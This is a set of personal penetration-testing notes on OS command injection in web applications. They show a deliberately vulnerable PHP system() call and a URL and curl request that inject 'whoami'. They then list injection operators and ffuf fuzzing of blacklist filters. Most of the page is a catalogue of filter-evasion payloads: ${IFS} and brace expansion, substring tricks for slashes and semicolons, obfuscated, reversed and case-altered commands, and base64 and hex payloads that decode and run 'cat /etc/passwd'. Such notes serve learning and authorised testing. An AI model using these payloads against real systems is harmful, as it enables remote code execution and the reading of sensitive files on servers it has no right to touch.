---
Primary_category: "[[WEB ATTACKS]]"
title: COMMAND INJECTION
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
  - card-list
  - purple-style
---

###### PRIMARY CATEGORY → [[WEB ATTACKS]]

#### *Exploitation*

##### *Detection*

The main idea of *command injection* is quite straigthforward, the web application relies on the user input at a certain point and pass it to a function which runs system commands, such as *system()* or *shell_exec()* on *PHP*

###### *Sample Code*

```php
if (isset($_GET['filename']))
{
	system('touch /tmp/' . $_GET['filename'] . '.pdf');
} else
{
	die("No HTTP Parameter provided");
}
```

##### *Command Injection*

As no input sanitization is performed, the above code is vulnerable to *command injection*. An adversary could inject the following payload and gain *RCE*

```bash
https://www.domain.tld/upload.php?filename=test;whoami
```

> ***Curl***

```bash
curl --silent --location --request GET --get --data-urlencode 'filename=test;whoami' "https://www.domain.tld/upload.php"
```

The following characters can be used when testing command injection

```bash
;
\n
&
|
&&
||
``
$()
```

---

#### *Filter Evasion - Blacklist*

##### *Injection Operators*

> ***e.g.*** **`& | && || ;`** ***and so on***

The web application may implement a series of validations such as blacklist chars. If so, we must detect which chars are not blacklisted in order to achive *code execution*

To do so, an operator may use a tool such as ***[Ffuf](https://github.com/ffuf/ffuf)*** and the ***[Special-Chars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars%20%2B%20urlencoded.txt)*** wordlist

###### *Validation Code*

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

###### *Fuzzing*

First, we should intercept the raw *HTTP* request with an *HTTP* proxy such as *Burp*. Then we can copy the former to a file and pass it to the *Ffuf* using the **`-request`** and **`-request-proto`** parameter

The command would look as follows

```bash
ffuf -v -t <THREADS> -request <REQUEST_FILE> -request-proto <REQUEST_PROTOCOL> -w <WORDLIST>
```

> [!DANGER]- *e.g.*
>
> ```bash
> ffuf -v -t 50 -w ./wordlist.txt -request request.txt -request-proto http -fs 648
> ```
>

##### *Blank Space*

A blank space is a character usually blocked by most blacklist filters. So, we have to work around and send a blank space without being blocked

To do so, we can use characters such as the following

```bash
%09 # Tab
${IFS} # Shell Env param which expands to '\s\t\n'
{<COMMAND>,<ARGS>} # BASH's Brace Expansion e.g. {ls,-la}
```

###### *Resources*

***[PayloadAllTheThings: Command Injection → Filter Bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)***

##### *Slash*

In *Linux* systems, there is no environment parameter that expands to just a slash, unlike blank spaces

However, there are several environment variables that contains slashes. Therefore, we can leverage the *Bash's substring expansion* to extract only the desired character

To do so, we will use the *$PATH* parameter

```bash
echo ${PATH:0:1}
```

##### *Semicolon*

Similarly to the slash character, we have to extract it from a enviromental parameter which contains characters other than semicolon

To do so, we will use the *substring expansion* again

```bash
echo ${LS_COLORS:10:1}
```

##### *Backslash*

On *Windows* systems we can also apply the same concept. Since the *backslash* character is used several times when a path is specified

- ***CMD***

```bash
echo %HOMEPATH:~6,-11%
```

- ***Powershell***

```bash
$env:HOMEPATH[0]
```

##### *Character Shifting*

Instead of search for the specific blacklisted character within the value of a certain environmental parameter, we can carry a *character shifting* using the *tr* binary

We will specify two *ASCII* ranges in each *tr* set, namely two sets, and pass the blacklisted char as input

The difference between the two sets is the range; one goes from *!* to *}* and the other from *"* to *~*. That is, the second set is one character ahead of the first

So, the following command shifts the character we pass by 1

```bash
echo $( tr '!-}' '"-~' <<<';' )
```

Therefore, all we have to do is find the character that is just before our needed character and pass the former as input to the above command

##### *Commands*

It may happen that the web application blocks entire commands instead of specific characters

###### *Validation Code*

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

If so, it's necessary to add certain characters between the blacklisted commands in order to bypass the current filter

To do this on *Linux* systems, we have several characters which are ignored by some shells, such as *bash* or *sh*, namely →

```bash
'
"
\
@ # Positional Parameter
```

In the other hand, we have the caret *^* character on *Windows* systems

###### *Payload*

Therefore, we can proceed with the following payloads

> ***Linux***

```bash
w\h\o\a\m\i
w'h'oam"i"
"w$@"h\o\a$@m'i'
```

> ***Windows***

```bash
who^ami
```

---

#### *Advanced Command Obfuscation*

##### *Case Manipulation*

As mentioned earlier, the web application may filter out some system commands instead of single characters

If so, we can use some techniques such as *Case Manipulation*. Remember that *Windows* systems are not case sensitive, so we can proceed as follows

```bash
wHoAmI
```

And it would work

However, this is not the case on *Linux* systems. Since they are case sensitive, the payload above would be invalid and the execution would fail

So, we have to get a more creative and use the following command

```bash
$( tr '[A-Z]' '[a-z]' <<<'wHoAmI' ) # tr command
$(a=wHoAmI;printf %s "{a,,}") # Parameter Expansion ,, (Upper to Lower)
```

##### *Reversed Commands*

Another option is to reverse the blacklisted command

###### *Linux*

```bash
echo 'whoami' | rev
$(rev<<<'imaohw')
```

###### *Windows*

> ***PS***

```bash
"whoami"[-1..-20] -join ''
IEX "$('imaohw'[-1..-20] -join '')"
```

##### *Encoded Commands*

Finally, we can choose to encode the command before sending it as a payload

It is helpful for commands containing filtered characters. We can use different types of encoding for this purpose

###### *Base64*

- ***Linux***

> ***Base64***

```bash
echo -n "cat /etc/passwd" | base64 -w 0
bash<<<$(base64 -d<<<"Y2F0IC9ldGMvcGFzc3dk")
```

- ***Windows***

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
IEX "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

###### *Hex*

> ***XXD***

```bash
echo -n  "cat /etc/passwd" | xxd -ps
bash<<<$(xxd -ps -r<<<"636174202f6574632f706173737764")
```

###### *Resources*

***[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)***

---

#### *Resources*

***[PayloadAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)***